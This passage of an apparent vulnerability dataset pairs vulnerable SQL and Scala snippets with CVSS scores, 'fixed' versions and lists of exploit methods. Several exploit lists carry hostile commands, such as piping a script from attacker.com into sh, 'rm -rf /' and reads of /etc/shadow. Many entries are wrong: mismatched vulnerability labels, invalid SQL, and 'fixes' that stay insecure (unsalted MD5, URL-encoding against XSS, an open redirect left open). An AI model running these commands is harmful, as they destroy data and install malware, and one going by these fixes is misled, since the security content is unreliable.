            "If the application does not properly sanitize and log SQL queries, an attacker could leverage this vulnerability to infer internal database structure or schema details."
        ]
    },
    "sql_43": {
        "vulnerability_type": "Clickjacking (Low Severity)",
        "vulnerability_code": "CREATE FUNCTION get_user_data(user_id INT) RETURNS TABLE AS $$ BEGIN RETURN QUERY SELECT * FROM users WHERE id = user_id; END; $$ LANGUAGE plpgsql;",
        "cvss_score": 3.5,
        "fixed_code": "CREATE FUNCTION get_user_data(user_id INT) RETURNS TABLE AS $$ BEGIN RETURN QUERY SELECT * FROM users WHERE id = user_id AND is_active = TRUE; END; $$ LANGUAGE plpgsql;",
        "exploit_ways": [
            "An attacker could trick users into clicking on invisible buttons that trigger actions in the application without their knowledge.",
            "Malicious iframes could be used to overlay a legitimate site with clickable elements that perform unintended actions when clicked by the user.",
            "Attackers can design phishing pages that incorporate the vulnerable application, making users believe they are interacting with a legitimate service while performing actions set by the attacker."
        ]
    },
    "sql_44": {
        "vulnerability_type": "Denial-of-Service (DoS) - Low Impact",
        "vulnerability_code": "SELECT * FROM users WHERE username = 'admin' OR '1'='1'",
        "cvss_score": 3.5,
        "fixed_code": "SELECT * FROM users WHERE username = ?",
        "exploit_ways": [
            "An attacker can input a very large string to cause the query to process slowly, consuming resources.",
            "Using special characters or large strings can lead to increased processing time on the database server.",
            "Crafting many requests with complex conditions could overload the database and slow down legitimate users."
        ]
    },
    "sql_45": {
        "vulnerability_type": "Race Condition (Difficult to Exploit)",
        "vulnerability_code": "CREATE FUNCTION update_balance(user_id INT, amount DECIMAL(10, 2)) RETURNS VOID AS $$\\nBEGIN\\n    UPDATE accounts SET balance = balance + amount WHERE id = user_id;\\nEND;$$ LANGUAGE plpgsql;",
        "cvss_score": 5.3,
        "fixed_code": "CREATE FUNCTION update_balance(user_id INT, amount DECIMAL(10, 2)) RETURNS VOID AS $$\\nDECLARE\\n    current_balance DECIMAL(10, 2);\\nBEGIN\\n    SELECT balance INTO current_balance FROM accounts WHERE id = user_id FOR UPDATE;\\n    UPDATE accounts SET balance = current_balance + amount WHERE id = user_id;\\nEND;$$ LANGUAGE plpgsql;",
        "exploit_ways": [
            "An attacker could manipulate the race condition to perform double spending by rapidly calling the function.",
            "By timing the transactions precisely, an attacker might exploit the race to create negative balances or overdraw funds.",
            "A malicious user could attempt to lock rows indefinitely using this race condition, causing denial of service."
        ]
    },
    "sql_46": {
        "vulnerability_type": "Open Redirect",
        "vulnerability_code": "CREATE TABLE users (\n    id INT PRIMARY KEY,\n    username VARCHAR(50),\n    password VARCHAR(100)\n);\n\nINSERT INTO users (id, username, password) VALUES (1, 'admin', 'hashed_password');\n\nCREATE FUNCTION redirect_user(uid INT) RETURNS TEXT AS $$\nDECLARE\n    user_url TEXT;\nBEGIN\n    SELECT CONCAT('http://example.com/', COALESCE((SELECT website FROM profiles WHERE user_id = uid), 'default')) INTO user_url;\n    RETURN user_url;\nEND;\n$$ LANGUAGE plpgsql;",
        "cvss_score": 6.5,
        "fixed_code": "CREATE TABLE users (\n    id INT PRIMARY KEY,\n    username VARCHAR(50),\n    password VARCHAR(100)\n);\n\nINSERT INTO users (id, username, password) VALUES (1, 'admin', 'hashed_password');\n\nCREATE FUNCTION redirect_user(uid INT) RETURNS TEXT AS $$\nDECLARE\n    user_url TEXT;\n    allowed_host TEXT := 'example.com';\nBEGIN\n    SELECT CONCAT('http://', allowed_host, '/', COALESCE((SELECT website FROM profiles WHERE user_id = uid), 'default')) INTO user_url;\n    RETURN user_url;\nEND;\n$$ LANGUAGE plpgsql;",
        "exploit_ways": [
            "An attacker could manipulate the 'website' field in the 'profiles' table to redirect users to a malicious site.",
            "By injecting a URL with an external domain, they could cause phishing attacks or distribute malware.",
            "Crafting specific URLs could lead to unintended redirections that compromise user trust and security."
        ]
    },
    "sql_47": {
        "vulnerability_type": "Session Fixation (Low Severity)",
        "vulnerability_code": "CREATE CLASS UserSession (\n    session_id VARCHAR(255),\n    user_id INT\n);\n\nINSERT INTO UserSession (session_id, user_id) VALUES ('fixed_session_id', 1);",
        "cvss_score": 4.0,
        "fixed_code": "CREATE CLASS UserSession (\n    session_id VARCHAR(255),\n    user_id INT,\n    created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP\n);\n\nINSERT INTO UserSession (session_id, user_id) VALUES (UUID(), 1);",
        "exploit_ways": [
            "An attacker can use the fixed session ID to hijack a legitimate user's session after they log in.",
            "By predicting or guessing the session ID, an attacker might gain unauthorized access to a user's account.",
            "If the session ID is exposed (e.g., in URLs), an attacker could craft malicious links to steal sessions."
        ]
    },
    "sql_48": {
        "vulnerability_type": "Denial-of-Service (DoS) - Low Impact",
        "vulnerability_code": "CREATE FUNCTION InfiniteLoop() RETURNS INT BEGIN WHILE TRUE DO END WHILE; RETURN 1; END;",
        "cvss_score": 4.0,
        "fixed_code": "CREATE FUNCTION SafeFunction() RETURNS INT BEGIN DECLARE i INT DEFAULT 0; WHILE i < 1000 DO SET i = i + 1; END WHILE; RETURN i; END;",
        "exploit_ways": [
            "An attacker can call InfiniteLoop to create a thread that never exits, consuming server resources.",
            "Multiple calls to InfiniteLoop can be made simultaneously to exacerbate the denial-of-service condition.",
            "Using stored procedures like InfiniteLoop in critical application flows can lead to system instability."
        ]
    },
    "sql_49": {
        "vulnerability_type": "Server-Side Request Forgery (SSRF) - Limited Scope",
        "vulnerability_code": "CREATE PROCEDURE GetUserProfile @UserID INT AS BEGIN DECLARE @URL NVARCHAR(255) SELECT @URL = ProfilePicture FROM Users WHERE ID = @UserID EXEC sp_OACreate 'MSXML2.XMLHTTP', @obj OUT EXEC sp_OAMethod @obj, 'open', NULL, 'GET', @URL, false EXEC sp_OAMethod @obj, 'send' END",
        "cvss_score": 7.5,
        "fixed_code": "CREATE PROCEDURE GetUserProfile @UserID INT AS BEGIN DECLARE @URL NVARCHAR(255) SELECT @URL = ProfilePicture FROM Users WHERE ID = @UserID IF LEFT(@URL, 4) <> 'http' RETURN EXEC sp_OACreate 'MSXML2.XMLHTTP', @obj OUT EXEC sp_OAMethod @obj, 'open', NULL, 'GET', @URL, false EXEC sp_OAMethod @obj, 'send' END",
        "exploit_ways": [
            "An attacker could input a URL pointing to an internal server (e.g., http://intranet) to access sensitive data.",
            "By providing a crafted URL with malicious parameters, the attacker might attempt to perform actions on the target server.",
            "Using a URL with a delay or slow response can be used to cause denial of service by exhausting server resources."
        ]
    },
    "scala_0": {
        "vulnerability_type": "Remote Code Execution (RCE)",
        "vulnerability_code": "def executeCommand(command: String): Unit = {\\n  import scala.sys.process._\\n  val cmd = Seq(\\\"bash\\\", \\\"-c\\\", command)\\n  cmd.!\\n}",
        "cvss_score": 8.5,
        "fixed_code": "def executeCommand(command: String): Unit = {\\n  import scala.sys.process._\\n  val allowedCommands = List(\\\"ls\\\", \\\"whoami\\\")\\n  if (allowedCommands.contains(command)) {\\n    Seq(\\\"bash\\\", \\\"-c\\\", command).!\\n  } else {\\n    println(\\\"Command not allowed\\\")\\n  }\\n}",
        "exploit_ways": [
            "User could input 'rm -rf /' to delete system files.",
            "Could use 'curl attacker.com/malware.sh | sh' to execute remote malicious code.",
            "Could chain commands like 'ls; cat /etc/passwd' to leak sensitive files."
        ]
    },
    "scala_1": {
        "vulnerability_type": "Cross-Site Scripting (XSS)",
        "vulnerability_code": "class VulnerableExample {\\ndef renderUserInput(input: String): String = {\\n  s\"<div>$input</div>\"\\n}\\n}",
        "cvss_score": 6.1,
        "fixed_code": "import java.net.URLEncoder\nclass SecureExample {\n  def renderUserInput(input: String): String = {\n    val encodedInput = URLEncoder.encode(input, \"UTF-8\")\n    s\"<div>$encodedInput</div>\"\n  }\n}",
        "exploit_ways": [
            "An attacker can inject a script like <script>alert('XSS')</script> to execute JavaScript in the victim's browser.",
            "Malicious scripts can be used to steal cookies or session tokens from other users of the application.",
            "Attackers can use XSS vectors to perform actions on behalf of the user, such as posting content under their name."
        ]
    },
    "scala_2": {
        "vulnerability_type": "Broken Authentication",
        "vulnerability_code": "class UserAuth {\\n  private var username: String = \"\"\\n  private var password: String = \"\"\\n\\n  def login(user: String, pass: String): Boolean = {\\n    if (user == username && pass == password) true else false\\n  }\\n\\n  def register(newUsername: String, newPassword: String): Unit = {\\n    username = newUsername\\n    password = newPassword\\n  }\\n}",
        "cvss_score": 6.5,
        "fixed_code": "import java.security.MessageDigest\\nclass UserAuth {\\n  private var storedHashedPassword: Array[Byte] = _\\n\\n  def hashPassword(password: String): Array[Byte] = {\\n    val md = MessageDigest.getInstance(\"SHA-256\")\\n    md.digest(password.getBytes)\\n  }\\n\\n  def login(userInput: String, passInput: String): Boolean = {\\n    storedHashedPassword sameElements hashPassword(passInput)\\n  }\\n\\n  def register(newUsername: String, newPassword: String): Unit = {\\n    // Store only the hashed password\\n    storedHashedPassword = hashPassword(newPassword)\\n  }\\n}",
        "exploit_ways": [
            "An attacker could guess or brute-force the username and password.",
            "If the same instance is reused, the attacker can register a new account with the same username to take over the existing user's credentials.",
            "A timing attack could be used to infer information about the length of the correct password."
        ]
    },
    "scala_3": {
        "vulnerability_type": "Privilege Escalation",
        "vulnerability_code": "def executeCommand(command: String): Process = {\n  val processBuilder = new java.lang.ProcessBuilder(\"bash\", \"-c\", command)\n  processBuilder.start()\n}",
        "cvss_score": 7.5,
        "fixed_code": "def executeCommand(command: String): Process = {\n  val allowedCommands = List(\"ls\", \"whoami\")\n  if (allowedCommands.contains(command)) {\n    val processBuilder = new java.lang.ProcessBuilder(List(\"bash\", \"-c\", command))\n    processBuilder.start()\n  } else {\n    throw new SecurityException(\"Command not allowed\")\n  }\n}",
        "exploit_ways": [
            "An attacker can input 'sudo rm -rf /' to delete all files on the system.",
            "Can use 'whoami; cat /etc/shadow' to obtain sensitive information.",
            "May chain commands like 'id; ls /root' to escalate privileges and access restricted data."
        ]
    },
    "scala_4": {
        "vulnerability_type": "Cross-Site Scripting (XSS)",
        "vulnerability_code": "def unsafe(inputString: String): String = {\\n  s\"<script>alert('$inputString')</script>\"\\n}",
        "cvss_score": 6.1,
        "fixed_code": "import java.net.URLEncoder\ndef safe(inputString: String): String = {\\n  val encodedInput = URLEncoder.encode(inputString, \"UTF-8\")\\n  s\"<script>alert('$encodedInput')</script>\"\\n}",
        "exploit_ways": [
            "An attacker can input malicious JavaScript to steal cookies or session tokens.",
            "By injecting a script that redirects the user to another site, attackers can perform phishing attacks.",
            "Injecting event handlers like 'onclick' into the script tag to execute actions on user interaction."
        ]
    },
    "scala_5": {
        "vulnerability_type": "Command Injection",
        "vulnerability_code": "import scala.io.StdIn\nobject VulnerableApp {\n  def main(args: Array[String]): Unit = {\n    println(\"Enter a command to execute:\")\n    val cmd = StdIn.readLine()\n    val process = Runtime.getRuntime.exec(cmd)\n    val output = new java.util.Scanner(process.getInputStream).useDelimiter(\\\\\"\\A\\\\\").next()\n    println(output)\n  }\n}",
        "cvss_score": 8.2,
        "fixed_code": "import scala.io.StdIn\nobject SecureApp {\n  def main(args: Array[String]): Unit = {\n    println(\"Enter a command to execute (only 'ls' is allowed):\")\n    val cmd = StdIn.readLine()\n    if (cmd == \"ls\") {\n      val process = Runtime.getRuntime.exec(Array(\"sh\", \"-c\", cmd))\n      val output = new java.util.Scanner(process.getInputStream).useDelimiter(\"\\A\").next()\n      println(output)\n    } else {\n      println(\"Command not allowed.\")\n    }\n  }\n}",
        "exploit_ways": [
            "User could input 'ls; rm -rf /' to delete system files.",
            "Could use 'curl attacker.com/malware.sh | sh' to execute remote malicious code.",
            "Could chain commands like 'whoami; cat /etc/passwd' to leak sensitive information."
        ]
    },
    "scala_6": {
        "vulnerability_type": "Cross-Site Request Forgery (CSRF)",
        "vulnerability_code": "class VulnerableController {\n  def transferMoney(request: HttpServletRequest): Unit = {\n    val toAccount = request.getParameter(\"toAccount\")\n    val amount = request.getParameter(\"amount\")\n    // Transfer money logic here\n  }\n}",
        "cvss_score": 6.5,
        "fixed_code": "class SecureController {\n  def transferMoney(request: HttpServletRequest): Unit = {\n    val csrfToken = request.getParameter(\"csrfToken\")\n    if (csrfToken == session.getAttribute(\"csrfToken\")) {\n      val toAccount = request.getParameter(\"toAccount\")\n      val amount = request.getParameter(\"amount\")\n      // Transfer money logic here\n    } else {\n      throw new SecurityException(\"CSRF Token Mismatch\")\n    }\n  }\n}",
        "exploit_ways": [
            "An attacker can craft a malicious link or form that sends a POST request to the transferMoney endpoint without proper CSRF protection, allowing unauthorized transactions.",
            "Using social engineering, an attacker can trick a user into clicking a specially crafted URL while logged into their bank account, leading to unintended money transfers.",
            "A malicious website could embed a hidden iframe that submits a form to the vulnerable application, exploiting the user's authenticated session."
        ]
    },
    "scala_7": {
        "vulnerability_type": "Privilege Escalation",
        "vulnerability_code": "def unsafeFunction(userInput: String): Unit = {\\n  val command = s\"/bin/bash -c \\\"$userInput\\\"\"\\n  Runtime.getRuntime.exec(command)\\n}",
        "cvss_score": 8.5,
        "fixed_code": "def safeFunction(userInput: String): Unit = {\\n  import java.util.Arrays\\n  val allowedCommands = Arrays.asList(\"ls\", \"whoami\")\\n  if (allowedCommands.contains(userInput)) {\\n    Runtime.getRuntime.exec(Array(\"/bin/bash\", \"-c\", userInput))\\n  } else {\\n    println(\"Command not allowed\")\\n  }\\n}",
        "exploit_ways": [
            "User could input 'sudo rm -rf /' to delete all files on the system.",
            "Could use 'id; sudo su' to gain root privileges.",
            "Could chain commands like 'echo hello > test.txt; cat /etc/shadow' to create a file and read sensitive data."
        ]
    },
    "scala_8": {
        "vulnerability_type": "Path Traversal",
        "vulnerability_code": "def readConfig(filePath: String): String = {\\n    val file = new java.io.File(filePath)\\n    scala.io.Source.fromFile(file).getLines().mkString(\"\")\\n}",
        "cvss_score": 8.5,
        "fixed_code": "def readConfig(filePath: String, baseDir: String): String = {\\n    val file = new java.io.File(baseDir + File.separator + filePath)\\n    scala.io.Source.fromFile(file).getLines().mkString(\"\")\\n}",
        "exploit_ways": [
            "An attacker can input '..\\config.txt' to read the parent directory's config file.",
            "They can provide a full path like '/etc/passwd' to access sensitive system files.",
            "Crafting a payload with special characters might lead to unexpected file reads or server crashes."
        ]
    },
    "scala_9": {
        "vulnerability_type": "Remote Code Execution (RCE)",
        "vulnerability_code": "import scala.io.StdIn\nobject VulnerableApp {\n  def main(args: Array[String]): Unit = {\n    println(\"Enter command to execute:\")\n    val command = StdIn.readLine()\n    Runtime.getRuntime.exec(command)\n  }\n}",
        "cvss_score": 8.2,
        "fixed_code": "import scala.io.StdIn\nobject SecureApp {\n  def main(args: Array[String]): Unit = {\n    println(\"Enter command to execute:\")\n    val allowedCommands = List(\"ls\", \"whoami\")\n    val command = StdIn.readLine()\n    if (allowedCommands.contains(command)) {\n      Runtime.getRuntime.exec(command)\n    } else {\n      println(\"Command not allowed\")\n    }\n  }\n}",
        "exploit_ways": [
            "User could input 'rm -rf /' to delete system files.",
            "Could use 'curl attacker.com/malware.sh | sh' to execute remote malicious code.",
            "Could chain commands like 'ls; cat /etc/passwd' to leak sensitive files."
        ]
    },
    "scala_10": {
        "vulnerability_type": "Insecure Deserialization",
        "vulnerability_code": "import java.io.{ByteArrayInputStream, ObjectInputStream}\nclass VulnerableApp {\n  def deserialize(bytes: Array[Byte]): Unit = {\n    val bis = new ByteArrayInputStream(bytes)\n    val ois = new ObjectInputStream(bis)\n    try {\n      ois.readObject()\n    } catch {\n      case e: Exception => println(e.getMessage())\n    }\n  }\n}",
        "cvss_score": 8.8,
        "fixed_code": "import java.io.{ByteArrayInputStream, ObjectInputStream}\nclass SecureApp {\n  def deserialize(bytes: Array[Byte]): Unit = {\n    // Implement safe deserialization logic here\n    println(\"Deserialization is disabled for security reasons.\")\n  }\n}",
        "exploit_ways": [
            "An attacker can send malicious serialized objects to execute arbitrary code.",
            "Attackers could exploit this vulnerability to perform remote code execution with the application's privileges.",
            "Malicious objects can be crafted to steal sensitive data from the application."
        ]
    },
    "scala_11": {
        "vulnerability_type": "Broken Authentication",
        "vulnerability_code": "import java.util.Base64\n\ncase class User(username: String, passwordHash: String)\nobject AuthSystem {\n  private val users = scala.collection.mutable.Map[String, User]()\n\n  def addUser(username: String, password: String): Unit = {\n    val encoder = Base64.getEncoder()\n    val encodedPassword = encoder.encodeToString(password.getBytes())\n    users += (username -> User(username, encodedPassword))\n  }\n\n  def authenticate(username: String, password: String): Boolean = {\n    val decoder = Base64.getDecoder()\n    users.get(username) match {\n      case Some(user) =>\n        val decodedHash = new String(decoder.decode(user.passwordHash))\n        decodedHash == password\n      case None => false\n    }\n  }\n}\nobject Main extends App {\n  AuthSystem.addUser(\"admin\", \"password123\")\n  println(AuthSystem.authenticate(args(0), args(1)))\n}",
        "cvss_score": 7.5,
        "fixed_code": "import java.security.MessageDigest\nimport java.util.Base64\ncase class User(username: String, passwordHash: String)\nobject AuthSystem {\n  private val users = scala.collection.mutable.Map[String, User]()\n\n  def hashPassword(password: String): String = {\n    val bytes = MessageDigest.getInstance(\"SHA-256\").digest(password.getBytes())\n    Base64.getEncoder().encodeToString(bytes)\n  }\n\n  def addUser(username: String, password: String): Unit = {\n    val encodedPassword = hashPassword(password)\n    users += (username -> User(username, encodedPassword))\n  }\n\n  def authenticate(username: String, password: String): Boolean = {\n    users.get(username) match {\n      case Some(user) =>\n        hashPassword(password) == user.passwordHash\n      case None => false\n    }\n  }\n}\nobject Main extends App {\n  AuthSystem.addUser(\"admin\", \"password123\")\n  println(AuthSystem.authenticate(args(0), args(1)))\n}",
        "exploit_ways": [
            "An attacker can use rainbow table attacks to find plaintext passwords for hashed values.",
            "They could try brute force attacks on the authenticate method if they know a valid username.",
            "By gaining access to the application's source code, an attacker could exploit the decoding vulnerability."
        ]
    },
    "scala_12": {
        "vulnerability_type": "SQL Injection",
        "vulnerability_code": "def unsafeQuery(param: String): List[String] = {\\n  val query = s\"SELECT * FROM users WHERE username = '$param'\"\\n  executeQuery(query)\\n}",
        "cvss_score": 8.2,
        "fixed_code": "def safeQuery(param: String): List[String] = {\\n  val query = \"SELECT * FROM users WHERE username = ?\"\\n  executeQueryWithParams(query, List(param))\\n}",
        "exploit_ways": [
            "An attacker can input 'admin' OR '1'='1' to bypass authentication.",
            "They can use 'UNION SELECT' to extract data from other tables.",
            "Input like '; DROP TABLE users' can delete critical data."
        ]
    },
    "scala_13": {
        "vulnerability_type": "Broken Authentication",
        "vulnerability_code": "import scala.io.StdIn\\ndef authenticate(): Boolean = {\\n    val username = StdIn.readLine(\"Enter username: \")\\n    val password = StdIn.readLine(\"Enter password: \")\\n    if (username == \"admin\" && password == getPasswordHash(username)) true else false\\n}\\ndef getPasswordHash(user: String): String = {\\n    // Simulated hash retrieval\\n    user match {\\n        case \"admin\" => \"5f4dcc3b5aa765d61d8327deb882cf99\"\\n        case _ => \"\"\\n    }\\n}",
        "cvss_score": 8.0,
        "fixed_code": "import scala.io.StdIn\nimport java.security.MessageDigest\n\ndef authenticate(): Boolean = {\n    val username = StdIn.readLine(\"Enter username: \")\n    val password = StdIn.readLine(\"Enter password: \")\n    val hashedPassword = hashPassword(password)\n    if (username == \"admin\" && hashedPassword == getPasswordHash(username)) true else false\n}\ndef getPasswordHash(user: String): String = {\n    // Simulated hash retrieval\n    user match {\n        case \"admin\" => \"5f4dcc3b5aa765d61d8327deb882cf99\" // Hash for password 'password'\n        case _ => \"\"\n    }\n}\ndef hashPassword(password: String): String = {\n    val md = MessageDigest.getInstance(\"MD5\")\n    md.update(password.getBytes)\n    md.digest.map(0xFF & _).map { \"%02x\".format(_) }.mkString\n}",
        "exploit_ways": [
            "An attacker could try common default passwords like 'admin' or 'password'.",
            "By using a rainbow table, an attacker might find the password for the admin account.",
            "If the system is reused with known vulnerabilities, an attacker could exploit session hijacking techniques."
        ]
    },
    "scala_14": {
        "vulnerability_type": "Path Traversal",
        "vulnerability_code": "import java.io.FileReader\nclass FileViewer {\n  def viewFile(filePath: String): Unit = {\n    val reader = new FileReader(filePath)\n    var i: Int = reader.read()\n    while (i != -1) {\n      print(i.toChar)\n      i = reader.read()\n    }\n    reader.close()\n  }\n}\nobject Main extends App {\n  if (args.length > 0) {\n    val viewer = new FileViewer\n    viewer.viewFile(args(0))\n  } else {\n    println(\"Please provide a file path.\")\n  }\n}",
        "cvss_score": 7.5,
        "fixed_code": "import java.io.FileReader\nimport java.nio.file.{Paths, Files}\nclass FileViewer {\n  def viewFile(filePath: String): Unit = {\n    val validPath = Paths.get(\"safe_directory\").resolve(filePath).normalize()\n    if (!validPath.startsWith(Paths.get(\"safe_directory\"))) {\n      println(\"Invalid file path\")\n      return\n    }\n    if (Files.exists(validPath)) {\n      val reader = new FileReader(validPath.toFile)\n      var i: Int = reader.read()\n      while (i != -1) {\n        print(i.toChar)\n        i = reader.read()\n      }\n      reader.close()\n    } else {\n      println(\"File does not exist\")\n    }\n  }\n}\nobject Main extends App {\n  if (args.length > 0) {\n    val viewer = new FileViewer\n    viewer.viewFile(args(0))\n  } else {\n    println(\"Please provide a file path.\")\n  }\n}",
        "exploit_ways": [
            "An attacker could input '../../etc/passwd' to read sensitive system files.",
            "Using '../confidential/file.txt' allows access to potentially confidential data.",
            "Crafting the path with './malicious_script.sh' could execute a script if file permissions allow."
        ]
    },
    "scala_15": {
        "vulnerability_type": "Cross-Site Request Forgery (CSRF)",
        "vulnerability_code": "def transferFunds(user: String, amount: Double): Boolean = {\n  // Simulate transferring funds\n  println(s\"Transferring $$amount to $user\")\n  true\n}",
        "cvss_score": 6.8,
        "fixed_code": "def transferFunds(user: String, amount: Double, csrfToken: String): Boolean = {\n  val expectedCsrfToken = session.get(\"csrfToken\") // Assume session management is in place\n  if (csrfToken == expectedCsrfToken) {\n    println(s\"Transferring $$amount to $user\")\n    true\n  } else {\n    false\n  }\n}",
        "exploit_ways": [
            "An attacker can create a malicious web page that, when visited by the victim, automatically submits a form transferring funds without their consent.",
            "Using JavaScript, an attacker can craft a request to transfer funds from the victim's account to another account controlled by the attacker.",
            "If CSRF protection tokens are not implemented, attackers could exploit this vulnerability through email phishing where victims click on links or open attachments that perform unauthorized actions."
        ]
    },
    "scala_16": {
        "vulnerability_type": "Broken Authentication",
        "vulnerability_code": "def authenticate(password: String): Boolean = {\n  val storedPassword = \"secret123\"\n  password.hashCode() == storedPassword.hashCode()\n}",
        "cvss_score": 7.5,
        "fixed_code": "import java.security.MessageDigest\n\ndef authenticate(password: String): Boolean = {\n  val md = MessageDigest.getInstance(\"SHA-256\")\n  val hashedStoredPassword = \"2bb80d537b1da3e38bd30361aa855686bde0eacd7162fef6a25fe97bf527a25b\"\n  val hashedInputPassword = md.digest(password.getBytes()).map(0xFF & _).map { \"%02x\".format(_) }.mkString\n  hashedStoredPassword == hashedInputPassword\n}",
        "exploit_ways": [
            "An attacker could use a hash collision to provide a password that hashes to the same value as the stored password.",
            "By brute-forcing common passwords, an attacker might find one that happens to have the same hash as the stored password.",
            "Crafting specific input strings that produce the same hash value as the stored password can bypass authentication."
        ]
    },
    "scala_17": {
        "vulnerability_type": "Command Injection",
        "vulnerability_code": "def executeCommand(command: String): Unit = {\n    import scala.sys.process._\n    command !\n}",
        "cvss_score": 8.2,
        "fixed_code": "def executeCommand(command: String): Unit = {\n    import scala.sys.process._\n    val allowedCommands = List(\"ls\", \"whoami\")\n    if (allowedCommands.contains(command)) {\n        command !\n    } else {\n        println(\"Command not allowed\")\n    }\n}",
        "exploit_ways": [
            "An attacker could input 'rm -rf /' to delete all files on the system.",
            "They could chain commands like 'whoami; cat /etc/passwd' to gather sensitive information.",
            "Using 'wget http://attacker.com/malware.sh -O - | sh' an attacker can execute remote code."
        ]
    },
    "scala_18": {
        "vulnerability_type": "Insecure Deserialization",
        "vulnerability_code": "def unsafeDeserialize(inputString: String): AnyRef = {\n    val bytes = Base64.getDecoder.decode(inputString)\n    val ois = new ObjectInputStream(new ByteArrayInputStream(bytes))\n    ois.readObject()\n}",
        "cvss_score": 7.5,
        "fixed_code": "def safeDeserialize(inputString: String): AnyRef = {\n    // Use a safer serialization format like JSON\n    import org.json4s._\n    import org.json4s.jackson.JsonMethods._\n    implicit val formats = DefaultFormats\n    parse(inputString).extract[AnyRef]\n}",
        "exploit_ways": [
            "An attacker could craft a malicious serialized object that executes arbitrary code upon deserialization.",
            "By sending specially crafted input, the attacker can exploit vulnerable classes leading to remote code execution.",
            "Insecure deserialization might allow attackers to manipulate application data leading to privilege escalation."
        ]
    },
    "scala_19": {
        "vulnerability_type": "Remote Code Execution (RCE)",
        "vulnerability_code": "import scala.io.StdIn\\nobject VulnerableApp {\\ndef main(args: Array[String]) = {\\nval cmd = StdIn.readLine(\"Enter command to execute: \")\\nnew java.util.Scanner(Runtime.getRuntime().exec(cmd).getInputStream()).useDelimiter(\\\\\"\\\\A\\\\\").next()\\n}\\n}",
        "cvss_score": 8.2,
        "fixed_code": "import scala.io.StdIn\\nobject SecureApp {\\ndef main(args: Array[String]) = {\\nval allowedCommands = List(\"ls\", \"whoami\")\\nval cmd = StdIn.readLine(\"Enter command to execute: \")\\nif (allowedCommands.contains(cmd)) {\\nnew java.util.Scanner(Runtime.getRuntime().exec(cmd).getInputStream()).useDelimiter(\\\\\"\\\\A\\\\\").next()\\n} else {\\nprintln(\"Command not allowed\")\\n}\\n}\\n}",
        "exploit_ways": [
            "User could input 'rm -rf /' to delete system files.",
            "Could use 'curl attacker.com/malware.sh | sh' to execute remote malicious code.",
            "Could chain commands like 'ls; cat /etc/passwd' to leak sensitive files."
        ]
    },
    "scala_20": {
        "vulnerability_type": "Privilege Escalation",
        "vulnerability_code": "import scala.sys.process._\ndef executeCommand(cmd: String): Unit = {\"sudo \" + cmd !}",
        "cvss_score": 8.2,
        "fixed_code": "import scala.sys.process._\ndef executeCommand(cmd: String): Unit = {\n    val allowedCommands = List(\"update\", \"upgrade\")\n    if (allowedCommands.contains(cmd)) {\n        s\"sudo $cmd\" !\n    } else {\n        println(\"Command not allowed\")\n    }\n}",
        "exploit_ways": [
            "An attacker can execute arbitrary commands with elevated privileges by passing malicious input.",
            "Could inject 'sudo -i' to gain a root shell if the user has sudo permissions without password.",
            "Possible to run 'apt-get install malicious_package' to install malware on the system."
        ]
    },
    "scala_21": {
        "vulnerability_type": "Insecure Deserialization",
        "vulnerability_code": "import java.io.{ObjectInputStream, ByteArrayInputStream}\ndef deserialize(data: Array[Byte]): Object = {\n    val bais = new ByteArrayInputStream(data)\n    val ois = new ObjectInputStream(bais)\n    val obj = ois.readObject()\n    ois.close()\n    bais.close()\n    obj\n}",
        "cvss_score": 8.5,
        "fixed_code": "import java.io.{ByteArrayInputStream, ObjectInputStream}\ndef deserialize(data: Array[Byte]): Option[YourAllowedClass] = {\n    val allowedClasses = Set(classOf[YourAllowedClass])\n    val bais = new ByteArrayInputStream(data)\n    val ois = new ObjectInputStream(bais) {\n        override def resolveClass(desc: java.io.ObjectStreamClass): Class[_] = {\n            val cl = super.resolveClass(desc)\n            if (!allowedClasses.contains(cl)) throw new SecurityException(s\"Unauthorized deserialization attempt for class: ${cl.getName}\")\n            cl\n        }\n    }\n    try {\n        val obj = ois.readObject()\n        Some(obj.asInstanceOf[YourAllowedClass])\n    } catch {\n        case e: SecurityException => None\n        case _: Throwable => None\n    } finally {\n        ois.close()\n        bais.close()\n    }\n}",
        "exploit_ways": [
            "An attacker can send a malicious serialized object that executes arbitrary code upon deserialization.",
            "Crafted payloads can be used to exploit known vulnerabilities in the libraries or classes being deserialized.",
            "The attacker could perform denial-of-service attacks by sending malformed serialized data, causing exceptions and resource exhaustion."
        ]
    },
    "scala_22": {
        "vulnerability_type": "Path Traversal",
        "vulnerability_code": "import java.io.FileReader\n\ndef readFile(filePath: String): Unit = {\n  val reader = new FileReader(filePath)\n  var i: Int = reader.read()\n  while (i != -1) {\n    print(i.toChar)\n    i = reader.read()\n  }\n  reader.close()\n}\n\nobject Main extends App {\n  println(\"Enter file path:\")\n  val inputPath = scala.io.StdIn.readLine()\n  readFile(inputPath)\n}",
        "cvss_score": 7.5,
        "fixed_code": "import java.io.FileReader\nimport java.nio.file.{Paths, Files}\ndef readFile(filePath: String): Unit = {\n  val allowedDirectory = Paths.get(\"/safe/directory\")\n  val absoluteFilePath = Paths.get(allowedDirectory.toString, filePath).normalize()\n  if (!absoluteFilePath.startsWith(allowedDirectory)) {\n    throw new IllegalArgumentException(\"Access denied\")\n  }\n  if (Files.exists(absoluteFilePath) && !Files.isDirectory(absoluteFilePath)) {\n    val reader = new FileReader(absoluteFilePath.toFile)\n    var i: Int = reader.read()\n    while (i != -1) {\n      print(i.toChar)\n      i = reader.read()\n    }\n    reader.close()\n  } else {\n    println(\"File does not exist or is a directory.\")\n  }\n}\n\nobject Main extends App {\n  println(\"Enter file path:\")\n  val inputPath = scala.io.StdIn.readLine()\n  readFile(inputPath)\n}",
        "exploit_ways": [
            "User could input \"../etc/passwd\" to read the system's password file.",
            "An attacker might provide \"/var/log/syslog\" to access sensitive logs.",
            "Using a crafted path like \"../../../../../etc/shadow\", an attacker can attempt to steal hashed passwords."
        ]
    },
    "scala_23": {
        "vulnerability_type": "Path Traversal",
        "vulnerability_code": "class FileReader {\n  def readFile(filePath: String): String = {\n    val file = new java.io.File(filePath)\n    val source = scala.io.Source.fromFile(file)\n    try source.mkString finally source.close()\n  }\n}",
        "cvss_score": 7.5,
        "fixed_code": "class FileReader {\n  def readFile(baseDir: String, filePath: String): String = {\n    val base = new java.io.File(baseDir)\n    val file = new java.io.File(base, filePath).getCanonicalFile\n    if (!file.getPath.startsWith(base.getPath)) {\n      throw new IllegalArgumentException(\"Access Denied\")\n    }\n    val source = scala.io.Source.fromFile(file)\n    try source.mkString finally source.close()\n  }\n}",
        "exploit_ways": [
            "An attacker could input '../../etc/passwd' to read system files.",
